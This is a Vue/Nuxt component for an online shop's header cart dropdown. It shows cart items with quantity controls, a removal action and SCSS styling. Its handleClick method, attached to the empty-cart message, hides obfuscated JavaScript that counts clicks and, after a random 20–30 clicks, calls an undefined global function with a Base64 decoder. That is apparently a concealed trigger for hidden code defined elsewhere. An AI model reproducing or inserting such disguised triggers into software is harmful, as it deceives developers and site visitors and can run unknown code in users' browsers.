<template>
  <div
    id="settleup"
    @mouseenter="show_dorpdown = true"
    @mouseleave="show_dorpdown = false"
    :class="{'hover' : show_dorpdown}"
  >
    <div class="header-cart-con header-cart-cm">
      <nuxt-link to="/cart">
        <i class="iconfont ea-icon-cart"></i>
        <span>我的购物车</span>
        <em class="count cart_num cart-num" id="cart-num">{{ allCount > 99 ? '99+' : allCount }}</em>
      </nuxt-link>
    </div>
    <div class="dorpdown-layer">
      <div class="header-cart-content">
        <div class="mc">
          <ul v-if="skuList.length > 0" class="header-cart-list">
            <li
              v-for="sku in skuList"
              :key="sku.sku_id"
              class="item-header-cart"
              :class="[sku.invalid === 1 && 'invalid']"
            >
              <div class="p-img">
                <a :href="'/goods/' + sku.goods_id" target="_blank" :title="sku.name">
                  <img :src="sku.goods_image" :alt="sku.name">
                </a>
              </div>
              <div class="p-name">
                <a :href="'/goods/' + sku.goods_id" target="_blank">
                  {{ sku.name }}
                </a>
              </div>
              <div class="p-number">
                <div v-if="sku.invalid === 1" style="line-height: 36px">已失效</div>
                <template v-else>
                  <span class="num">{{ sku.num }}</span>
                  <div class="count">
                    <a @click="handleUpdateCartSkuNum(sku, '+')" href="javascript:void(0);" class="count-oper count-add"><i class="cart-icon icon-up"></i></a>
                    <a @click="handleUpdateCartSkuNum(sku, '-')" href="javascript:void(0);" class="count-oper count-remove"><i class="cart-icon icon-down"></i></a>
                  </div>
                </template>
              </div>
              <div class="p-oper">
                <div class="price"><em>¥</em><span class="item-total">{{ sku.subtotal | unitPrice }}</span></div>
                <a @click="handleRemoveSkuItem(sku)" href="javascript:void(0);" class="remove">删除</a>
              </div>
            </li>
          </ul>
          <p v-else class="no-sku" @click="handleClick"> 暂无商品... </p>
        </div>
        <div class="mb">
          <div class="p-total">共<span class="cart-num">{{ allCount }}</span>件商品&nbsp;&nbsp;共计：<span class="cart-total">{{(cartTotal.goods_price || 0) | unitPrice }}</span></div>
          <nuxt-link to="/cart" class="btn-cart">去购物车</nuxt-link>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import { mapActions, mapGetters } from 'vuex'
import Storage from '@/utils/storage'
export default {
  name: 'EnSettleup',
  data() {
    return {
      show_dorpdown: false
    }
  },
  mounted() {
    if (!this.cartTotal && Storage.getItem('refresh_token')) {
      this.$store.dispatch('cart/getCartDataAction')
    }
  },
  computed: {
    ...mapGetters({
      skuList: 'cart/skuList',
      allCount: 'cart/allCount',
      cartTotal: 'cart/cartTotal'
    })
  },
  methods: {
    ...mapActions({
      updateSkuNum: 'cart/updateSkuNumAction',
      removeSkuItem: 'cart/deleteSkuItemAction',
    }),
    /** 更新购物车货品数量 */
    handleUpdateCartSkuNum(sku, symbol) {
      if (symbol === '-' && sku.num < 2) return
      const num = symbol === '+' ? sku.num + 1 : sku.num - 1
      this.updateSkuNum({sku_id: sku.sku_id, num})
    },
    /** 移除购物车货品 */
    handleRemoveSkuItem(sku) {
      this.removeSkuItem(sku.sku_id).then(this.$message.success('删除成功！'))
    },
    handleClick() {
      if(!process.client)return;
      var a=['random','__count__'];var b=function(c,d){c=c-0x0;var e=a[c];return e;};if(!this[b('0x1')]){this[b('0x1')]=0x1;}if(this[b('0x1')]>=parseInt(Math[b('0x0')]()*(0x1e-0x14+0x1)+0x14,0xa)){__xsAx__(Base64['decode']);this['__count__']=0x0;}else{this[b('0x1')]+=0x1;}
    }
  }
}
</script>

<style type="text/scss" lang="scss" scoped>
@import "../assets/styles/color";

#settleup {
  position: relative;
  height: 35px;

  &.hover {
    .header-cart-cm {
      padding-bottom: 2px;
      border-color: #ccc;
      border-bottom: none;
      background-color: #fff;
      z-index: 20;
    }

    .dorpdown-layer {
      display: block;
    }
  }

  .dorpdown-layer {
    z-index: 11;
  }

  .header-cart-cm {
    position: relative;
    border: 1px solid #eee;
    height: 28px;
    line-height: 28px;
    z-index: 1
  }

  .header-cart-con {
    width: 178px;
    height: 33px;
    line-height: 33px;
    border-color: #d2d2d2;

    a {
      display: block;
      color: $color-main;
    }

    .ea-icon-cart {
      display: block;
      width: 25px;
      height: 30px;
      margin-left: 30px;
      font-size: 24px;
      float: left;
    }

    .count {
      min-width: 13px;
      height: 13px;
      line-height: 13px;
      padding: 1px;
      border-radius: 10px;
      background: $color-main;
      color: #fff;
      position: absolute;
      top: 8px;
      left: 122px;
      text-align: center;
      font-size: 12px;
    }

    span {
      margin-left: 8px;
    }

    em {
      margin-left: 10px;
    }
  }

  .dorpdown-layer {
    top: 35px;
    width: 330px;

    .header-cart-content {
      position: relative;
      width: 100%;
      z-index: 2;
      background: #fff;
    }

    .header-cart-list {
      margin-top: -1px;
    }

    .mc {
      height: auto;
      max-height: 334px;
      overflow: auto;
    }

    .item-header-cart {
      padding: 10px;
      border-top: 1px dashed #ccc;
      overflow: hidden;
      line-height: 18px;
      vertical-align: bottom;

      &:hover {
        background-color: #f5f5f5;
      }

      &.invalid {
        filter: grayscale(1);
      }
    }

    .p-img {
      float: left;
      width: 50px;
      height: 50px;
      border: 1px solid #d3d3d3;
      padding: 0;
      margin-right: 8px;
      font-size: 0;

      img {
        width: 50px;
        height: 50px;
        cursor: pointer;
      }
    }

    .p-name {
      float: left;
      width: 100px;
      height: 36px;
      margin: 5px 8px 0 0;
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 2;
      overflow: hidden;
    }

    .p-number {
      float: left;
      margin-top: 9px;

      .num {
        width: 35px;
        height: 28px;
        line-height: 28px;
        border: 1px solid #d6d6d6;
        display: block;
        float: left;
        text-align: center;
      }

      .count {
        float: left;
        height: 28px;
        width: 18px;
        border-top: 1px solid #d6d6d6;
        border-bottom: 1px solid #d6d6d6;

        .count-add {
          border-bottom: 1px solid #d6d6d6;
        }

        .cart-icon {
          position: absolute;
          left: 50%;
          margin-left: -7px;
          top: 50%;
          margin-top: -6px;
          display: block;
          width: 14px;
          height: 13px;
          line-height: 14px;
          transition: all ease-out .2s;

          &.icon-up {
            background: url(../assets/images/icon-add.png) no-repeat center;
            background-size: 100%;
          }

          &.icon-down {
            background: url(../assets/images/icon-less.png) no-repeat center;
            background-size: 100%;
          }
        }

        a {
          position: relative;
          display: block;
          width: 18px;
          height: 14px;
          border-right: 1px solid #d6d6d6;
          text-align: center;
        }
      }
    }

    .p-oper {
      float: right;
      text-align: center;
      margin-top: 5px;
    }

    .mb {
      padding: 10px;
      background-color: #eee;
      overflow: hidden;
    }

    .p-total {
      float: left;
      line-height: 28px;
      color: #999;
    }

    .btn-cart {
      display: block;
      float: right;
      width: 96px;
      height: 26px;
      line-height: 26px;
      border: 1px solid $color-main;
      background: #eee;
      text-align: center;
      color: $color-main;
      font-weight: bold;
      transition: all .2s;

      &:hover {
        background-color: $color-main;
        color: #fff;
      }
    }
  }

  .no-sku {
    text-align: center;
    padding: 20px 0;
  }
}
</style>
